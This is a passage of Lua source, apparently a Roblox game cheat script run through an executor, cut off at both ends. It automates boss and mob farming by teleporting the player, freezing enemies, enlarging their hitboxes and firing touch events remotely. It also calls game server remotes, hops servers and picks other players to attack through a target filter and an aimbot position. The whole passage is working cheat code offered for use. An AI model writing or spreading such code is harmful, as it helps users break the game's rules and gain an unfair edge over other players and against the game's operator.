                                elseif game.Workspace.Enemies:FindFirstChild("Arctic Warrior") or game.Workspace.Enemies:FindFirstChild("Snow Lurker") then
                                    target = getClosest({"Arctic Warrior", "Snow Lurker"})
                                    if target then
                                        v = target
                                        if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = true
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    end
                                else
                                    toPoint(CFrame.new(5733.30615234375, 28.366647720336914, -6400.83837890625))
                                end
                            end
                        else
                            firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.IceCastle.RengokuChest.Detection, 0)
                            wait()
                            firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.IceCastle.RengokuChest.Detection, 1)
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Kill Darkbeard"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Darkbeard") then
                            v = game.Workspace.Enemies:FindFirstChild("Darkbeard")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Auto Kill Darkbeard"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Darkbeard") then
                            v = game.ReplicatedStorage:FindFirstChild("Darkbeard")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            useNearestEntrance(CFrame.new(3722.79785, 130.531006, -3403.83496, -0.789356351, 6.58137063e-34, -0.613935292, 1.45974817e-33, 1, -8.04847758e-34, 0.613935292, -1.53150264e-33, -0.789356351))
                            toTarget(CFrame.new(3722.79785, 130.531006, -3403.83496, -0.789356351, 6.58137063e-34, -0.613935292, 1.45974817e-33, 1, -8.04847758e-34, 0.613935292, -1.53150264e-33, -0.789356351))
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if FarmEctoplasm and second_sea then
                        if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not FarmEctoplasm or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            end
                        else
                            useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                            toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Ghoul Race"] and second_sea then
                        if LP.Data.Race.Value ~= "Ghoul" then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "BuyCheck", 4)
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Change", 4)
                            if not isItemInEquip("Hellfire Torch") then
                                if game.Workspace.Enemies:FindFirstChild("Cursed Captain") then
                                    v = game.Workspace.Enemies:FindFirstChild("Cursed Captain")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health <= 0 then 
                                            toTarget(LP.Character.HumanoidRootPart.CFrame)
                                        else
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                MonName = v.Name
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif game.ReplicatedStorage:FindFirstChild("Cursed Captain") then
                                    v = game.ReplicatedStorage:FindFirstChild("Cursed Captain")
                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    wait(2)
                                else
                                    if GetMaterial("Ectoplasm") < 100 then
                                        if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                                if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                        repeat task.wait()
                                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            BringMobFarm = true
                                                            PosMon = v.HumanoidRootPart.CFrame
                                                            EquipWeapon(_G.SelectWeapon)
                                                            v.HumanoidRootPart.Transparency = 1
                                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        until not getgenv().EuphoriaSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                                    end
                                                end
                                            end
                                        else
                                            useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                            toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                        end
                                    else
                                        if getgenv().EuphoriaSettings["Auto Ghoul Race Hop"] and not _G.HopLowestActivated then 
                                            HopToLowestServer() 
                                        end
                                    end
                                end
                            elseif GetMaterial("Ectoplasm") < 100 then
                                if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") then
                                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                        if v.Name == "Ship Deckhand" or v.Name == "Ship Steward" or v.Name == "Ship Officer" or v.Name == "Ship Engineer" then
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat task.wait()
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = v.HumanoidRootPart.CFrame
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                until not getgenv().EuphoriaSettings["Auto Ghoul Race"] or not v.Parent or v.Humanoid.Health <= 0
                                            end
                                        end
                                    end
                                else
                                    useNearestEntrance(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                    toPoint(CFrame.new(924.223206, 200.908279, 33170.918, -0.999253929, 5.15007308e-08, -0.0386204608, 5.71251277e-08, 1, -1.44529054e-07, 0.0386204608, -1.46627428e-07, -0.999253929))
                                end
                            else
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "BuyCheck", 4)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Buy", 4)
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("Ectoplasm", "Change", 4)
                            end
                        end
                    end
                end)
            end
        end)
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Factory"] and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Core") then
                            v = game.Workspace.Enemies:FindFirstChild("Core")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Auto Factory"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Core") then
                            v = game.ReplicatedStorage:FindFirstChild("Core")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().EuphoriaSettings["Auto Factory Hop"] then
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Swan Glasses"] then
                        AutoDonSwan = true
                    else
                        AutoDonSwan = false
                    end
                    if getgenv().EuphoriaSettings["Swan Glasses Hop"] then
                        AutoDonSwanHop = true
                    else
                        AutoDonSwanHop = false
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if (AutoDonSwan or AutoSea3DonSwan) and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Don Swan") then
                            v = game.Workspace.Enemies:FindFirstChild("Don Swan")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not (AutoDonSwan or AutoSea3DonSwan) or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Don Swan") then
                            v = game.ReplicatedStorage:FindFirstChild("Don Swan")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if (AutoSea3DonSwanHop or AutoDonSwanHop) then
                                if getDistance(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685)) < 40 then
                                    HopServer()
                                else
                                    toTarget(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685))
                                end
                            else
                                toTarget(CFrame.new(2291.04883, 73.925766, 834.2948, 0.998714685, 1.06858053e-07, -0.0506853238, -1.06115984e-07, 1, 1.73316987e-08, 0.0506853238, -1.19308989e-08, 0.998714685))
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if (FarmWaterKey or FarmWaterKeyGH) and not isItemInEquip("Water Key") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Tide Keeper") then
                            v = game.Workspace.Enemies:FindFirstChild("Tide Keeper")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not (FarmWaterKeyGH or FarmWaterKey) or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Tide Keeper") then
                            v = game.ReplicatedStorage:FindFirstChild("Tide Keeper")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if (FarmWaterKeyHop or FarmWaterKeyGH) and not isItemInEquip("Water Key") then 
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if (FarmLibraryKey or FarmLibraryKeyGH) and not isItemInEquip("Library Key") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") then
                            v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Farm Water Key"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Awakened Ice Admiral") then
                            v = game.ReplicatedStorage:FindFirstChild("Awakened Ice Admiral")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if (FarmLibraryKeyGH or FarmLibraryKeyHop) and not isItemInEquip("Library Key") then 
                                HopServer()
                            end
                        end
                    else
                        if isItemInEquip("Library Key") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("OpenLibrary")
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Gravity Cane"] and not isWeaponInInventory("Gravity Cane") and second_sea then
                        if game.Workspace.Enemies:FindFirstChild("Fajita") then
                            v = game.Workspace.Enemies:FindFirstChild("Fajita")
                            if v:FindFirstChild("HumanoidRootPart") then
                                if v.Humanoid.Health <= 0 then 
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                else
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        RenMon = v.Name
                                        RenPos = v.HumanoidRootPart.CFrame
                                    until not getgenv().EuphoriaSettings["Gravity Cane"] or not v.Parent or v.Humanoid.Health <= 0
                                end
                            else
                                toTarget(LP.Character.HumanoidRootPart.CFrame)
                            end
                        elseif game.ReplicatedStorage:FindFirstChild("Fajita") then
                            v = game.ReplicatedStorage:FindFirstChild("Fajita")
                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            wait(4)
                        else
                            if getgenv().EuphoriaSettings["Gravity Cane Hop"] then 
                                HopServer()
                            end
                        end
                    end
                end)
            end
        end)
        
        function useNearestEntrance(targetCFrame)
            
            local entrancesFirstSea = {Vector3.new(61164.19921875, 7.326029300689697, 1856.9254150390625), Vector3.new(-4607.82275390625, 874.3905029296875, -1667.556884765625), Vector3.new(-7894.61767578125, 5547.1416015625, -380.29119873046875)}
            local entrancesSecondSea = {Vector3.new(-287.952209, 306.130615, 605.197021), Vector3.new(-6498.72119, 83.1870193, -134.912308), Vector3.new(917.5881958007812, 125.08329772949219, 32863.19921875), Vector3.new(2282.219970703125, 34.56594467163086, 885.0680541992188)}
            local entrancesThirdSea = {Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125), Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953), Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125), Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586), Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875), Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656)}
            if first_sea then
                entrances = entrancesFirstSea
            end
            if second_sea then
                entrances = entrancesSecondSea
            end
            if third_sea then
                entrances = entrancesThirdSea
            end
            local playerToTargetDistance = (targetCFrame.Position - LP.Character.HumanoidRootPart.CFrame.Position).Magnitude
            local distance = math.huge
            local needEntrance = Vector3.new(0,0,0)
            for i, entrance in pairs(entrances) do
                entranceToTargetDistance = (entrance - targetCFrame.Position).Magnitude
                if entranceToTargetDistance < playerToTargetDistance and entranceToTargetDistance < distance then
                    distance = entranceToTargetDistance
                    needEntrance = entrance
                end
            end
            if needEntrance ~= Vector3.new(0,0,0) then 
                RequestEntrance(needEntrance)
                return true
            else 
                return false 
            end
            return false
        end
        
        function StopTween()
            NoClip = false
            StoppedTween = true
            toTarget(LP.Character.HumanoidRootPart.CFrame)
        end

        function GetMaterial(name)
            if PlayerData.Materials[name] then
                return PlayerData.Materials[name].Count
            else
                return 0
            end
        end

        function CanIKillThisShit(target)
            if target.Backpack:FindFirstChild("Buddha-Buddha") or target.Backpack:FindFirstChild("Dough-Dough") or target.Backpack:FindFirstChild("Kitsune-Kitsune") then
                return false
            end
            if target.Data.Level.Value < 21 then
                return false
            end
            if target.Character.Health > LP.Data.Stats.Melee.Level.Value * 8 then
                return false
            end
            if target.Character:FindFirstChild("HumanoidRootPart") and getDistance(target.Character.HumanoidRootPart.CFrame) < 100 and LP.PlayerGui.Main.PvpDisabled.Visible and string.find(LP.PlayerGui.Main.PvpDisabled.Text, "Safe Zone") then
                return false
            end
            return true
        end

        function GetAvailableSkills(checkSkills)
            local skills
            local skill
            local tool
            local needLevel
            skills = {}
            if LP.Character:FindFirstChildOfClass("Tool") then
                tool = LP.Character:FindFirstChildOfClass("Tool")
                level = tool.Level.Value
                skill = "Z"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "X"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "C"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "V"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                skill = "F"
                if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill) then
                    needLevel = nil
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 8 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -3))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 7 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -2))
                    end
                    if string.len(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text) == 6 then
                        needLevel = tonumber(string.sub(LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Level.Text, -1))
                    end
                    if needLevel then
                        if level >= needLevel then
                            if LP.PlayerGui.Main.Skills[tool.Name]:FindFirstChild(skill).Cooldown.Size == UDim2.new(0, 0, 1, -1) then
                                table.insert(skills, skill)
                            end
                        end
                    end
                end
                if checkSkills then
                    skillsNew = {}
                    for _1,skillAv in ipairs(skills) do
                        for _2,skillCheck in ipairs(checkSkills) do
                            if skillAv == skillCheck then
                                table.insert(skillsNew, skillAv)
                            end
                        end
                    end
                    return skillsNew
                else
                    return skills
                end
            else
                return {}
            end
        end
        
        function AttackSkill(SkillTarget, hitboxPos)
            local Tool = LP.Character:FindFirstChildOfClass("Tool")
            if Tool then
                if SkillTarget then              
                    local ToolName = LP.Character:FindFirstChildOfClass("Tool").Name
                    local ToolTip = LP.Character:FindFirstChildOfClass("Tool").ToolTip
                    if ToolName == "Dragon-Dragon" then
                        currSkill = GetAvailableSkills({"Z", "C"})[1]
                    elseif ToolName == "Kitsune-Kitsune" then
                        currSkill = GetAvailableSkills({"Z", "C", "X"})[1]
                    elseif ToolName == "Portal-Portal" then
                        currSkill = GetAvailableSkills({"Z", "X"})[1]
                    elseif ToolName == "Leopard-Leopard" then
                        currSkill = GetAvailableSkills({"Z", "X", "C"})[1]
                    else
                        currSkill = GetAvailableSkills({"Z", "X", "C", "V"})[1]
                    end
                    if currSkill then
                        if not hitboxPos then
                            aimPos = nil
                            if SkillTarget:FindFirstChild("AttackSeat") then
                                aimPos = SkillTarget.AttackSeat.CFrame.Position
                            elseif SkillTarget:FindFirstChild("HumanoidRootPart") then
                                aimPos = SkillTarget.HumanoidRootPart.Position
                            elseif SkillTarget:FindFirstChild("Character") and SkillTarget:FindFirstChild("Character"):FindFirstChild("HumanoidRootPart") then
                                aimPos = SkillTarget.Character.HumanoidRootPart.Position
                            end
                        else
                            aimPos = hitboxPos
                        end
                        _G.AimbotPos = aimPos
                        local Target = Tool:FindFirstChild("RemoteFunction")
                        if Target then
                            Target:InvokeServer(currSkill)
                        end
                        game:service('VirtualInputManager'):SendKeyEvent(true, currSkill, false, game)
                        wait(0.05)
